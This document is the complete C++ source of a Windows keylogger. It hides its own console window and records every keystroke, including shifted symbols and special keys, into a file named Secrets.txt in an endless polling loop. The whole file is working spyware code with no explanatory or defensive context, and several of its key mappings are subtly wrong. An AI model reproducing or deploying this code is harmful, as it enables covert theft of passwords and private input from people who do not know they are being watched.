#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include <iostream>
using namespace std;

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	int keyPressed;
	ofstream secrets("Secrets.txt", ios::app);
	while (true) {
		Sleep(0); //lower CPU load
		for (keyPressed = 8; keyPressed < 223; keyPressed += 1) {
			if (GetAsyncKeyState(keyPressed) == -32767) {
				if (GetAsyncKeyState(VK_BACK))
					secrets << "<BACKSPACE>";
				if (GetAsyncKeyState(VK_TAB))
					secrets << "\t";
				if (GetAsyncKeyState(VK_RETURN))
					secrets << "\n";
				if (GetAsyncKeyState(VK_CONTROL))
					secrets << "<CONTROL>";
				if (GetAsyncKeyState(0x12))
					secrets << "<ALT>";
				if (GetAsyncKeyState(VK_PAUSE))
					secrets << "<PAUSE/BREAK>";
				if (GetAsyncKeyState(VK_CAPITAL))
					secrets << "<CAPS>";
				if (GetAsyncKeyState(VK_ESCAPE))
					secrets << "<ESC>";
				if (GetAsyncKeyState(VK_SPACE))
					secrets << " ";
				if (GetAsyncKeyState(0x21))
					secrets << "<PAGE UP>";
				if (GetAsyncKeyState(0x22))
					secrets << "<PAGE DOWN>";
				if (GetAsyncKeyState(VK_END))
					secrets << "<END>";
				if (GetAsyncKeyState(VK_HOME))
					secrets << "<HOME>";
				if (GetAsyncKeyState(VK_LEFT))
					secrets << "<LEFT ARROW>";
				if (GetAsyncKeyState(VK_UP))
					secrets << "<UP ARROW>";
				if (GetAsyncKeyState(VK_RIGHT))
					secrets << "<RIGHT ARROW>";
				if (GetAsyncKeyState(VK_DOWN))
					secrets << "<DOWN ARROW>";
				if (GetAsyncKeyState(VK_INSERT))
					secrets << "<INSERT>";
				if (GetAsyncKeyState(VK_DELETE))
					secrets << "<DELETE>";
				if (keyPressed > 47 && keyPressed < 58) {
					switch (keyPressed) {
						case 48:
							GetAsyncKeyState(VK_SHIFT) ? secrets << ")" : secrets << (char)keyPressed;
							break;
						case 49:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "!" : secrets << (char)keyPressed;
							break;
						case 50:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "@" : secrets << (char)keyPressed;
							break;
						case 51:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "#" : secrets << (char)keyPressed;
							break;
						case 52:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "$" : secrets << (char)keyPressed;
							break;
						case 53:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "%" : secrets << (char)keyPressed;
							break;
						case 54:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "^" : secrets << (char)keyPressed;
							break;
						case 55:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "&" : secrets << (char)keyPressed;
							break;
						case 56:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "*" : secrets << (char)keyPressed;
							break;
						case 57:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "(" : secrets << (char)keyPressed;
							break;
					}
				}
				if (keyPressed > 64 && keyPressed < 91) {
					if(!GetAsyncKeyState(VK_SHIFT))
						keyPressed += 32;
					secrets << (char)keyPressed;
				}
				if (keyPressed > 185 && keyPressed < 193) {
					switch (keyPressed) {
						case 186:
							GetAsyncKeyState(VK_SHIFT) ? secrets << ":" : secrets << ";";
							break;
						case 187:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "+" : secrets << "=";
							break;
						case 188:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "<" : secrets << ",";
							break;
						case 189:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "_" : secrets << "-";
							break;
						case 190:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "." : secrets << ">";
							break;
						case 191:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "?" : secrets << "/";
							break;
						case 192:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "~" : secrets << "`";
							break;
					}
				}
				if (keyPressed > 218 && keyPressed < 223) {
					switch (keyPressed) {
						case 219:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "{" : secrets << "[";
							break;
						case 220:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "|" : secrets << "|";
							break;
						case 221:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "}" : secrets << "]";
							break;
						case 222:
							GetAsyncKeyState(VK_SHIFT) ? secrets << "\"" : secrets << "'";
							break;
					}
				}
				secrets.flush();
			}
		}
	}
}